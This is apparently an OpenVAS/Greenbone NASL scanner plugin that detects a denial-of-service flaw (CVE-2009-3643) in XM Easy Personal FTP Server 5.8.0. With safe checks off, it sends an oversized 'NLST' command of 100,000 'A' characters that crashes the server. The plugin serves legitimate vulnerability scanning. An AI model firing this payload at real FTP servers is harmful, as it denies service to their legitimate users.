if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.100342" );
	script_version( "2020-08-24T08:40:10+0000" );
	script_tag( name: "last_modification", value: "2020-08-24 08:40:10 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2009-11-13 12:21:24 +0100 (Fri, 13 Nov 2009)" );
	script_bugtraq_id( 37008, 36969 );
	script_cve_id( "CVE-2009-3643" );
	script_tag( name: "cvss_base", value: "5.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:N/I:N/A:P" );
	script_name( "XM Easy Personal FTP Server 'NLST' Command Remote Denial of Service Vulnerability" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/bid/37008" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/bid/36969" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/archive/1/507785" );
	script_category( ACT_MIXED_ATTACK );
	script_tag( name: "qod_type", value: "remote_banner" );
	script_family( "FTP" );
	script_copyright( "Copyright (C) 2009 Greenbone Networks GmbH" );
	script_dependencies( "ftpserver_detect_type_nd_version.sc" );
	script_require_ports( "Services/ftp", 21 );
	script_mandatory_keys( "ftp/xm_easy_personal/detected" );
	script_tag( name: "summary", value: "XM Easy Personal FTP Server is prone to a remote denial-of-service
  vulnerability." );
	script_tag( name: "impact", value: "This issue allows remote attackers to crash affected FTP servers,
  denying service to legitimate users." );
	script_tag( name: "affected", value: "XM Easy Personal FTP Server 5.8.0 is vulnerable. Other versions may
  also be affected." );
	script_tag( name: "solution_type", value: "WillNotFix" );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one." );
	exit( 0 );
}
require("ftp_func.inc.sc");
require("misc_func.inc.sc");
require("port_service_func.inc.sc");
require("version_func.inc.sc");
ftpPort = ftp_get_port( default: 21 );
banner = ftp_get_banner( port: ftpPort );
if(!banner || !egrep( pattern: "Welcome to DXM's FTP Server", string: banner )){
	exit( 0 );
}
if( safe_checks() ){
	version = eregmatch( pattern: "Welcome to DXM's FTP Server ([0-9.]+)", string: banner );
	if(version[1] && version_is_equal( version: version[1], test_version: "5.8.0" )){
		security_message( port: ftpPort );
		exit( 0 );
	}
}
else {
	soc1 = open_sock_tcp( ftpPort );
	if(!soc1){
		exit( 0 );
	}
	kb_creds = ftp_get_kb_creds();
	user = kb_creds["login"];
	pass = kb_creds["pass"];
	login_details = ftp_log_in( socket: soc1, user: user, pass: pass );
	if(login_details){
		ftpPort2 = ftp_get_pasv_port( socket: soc1 );
		if(ftpPort2){
			soc2 = open_sock_tcp( port: ftpPort2, transport: get_port_transport( ftpPort ) );
			if(soc2){
				bo_data = NASLString( "NLST ", crap( length: 100000, data: "A" ) );
				send( socket: soc1, data: bo_data );
				close( soc2 );
				close( soc1 );
				sleep( 2 );
				soc3 = open_sock_tcp( ftpPort );
				if(!ftp_recv_line( socket: soc3 )){
					security_message( port: ftpPort );
					close( soc3 );
					exit( 0 );
				}
			}
		}
	}
}
exit( 0 );

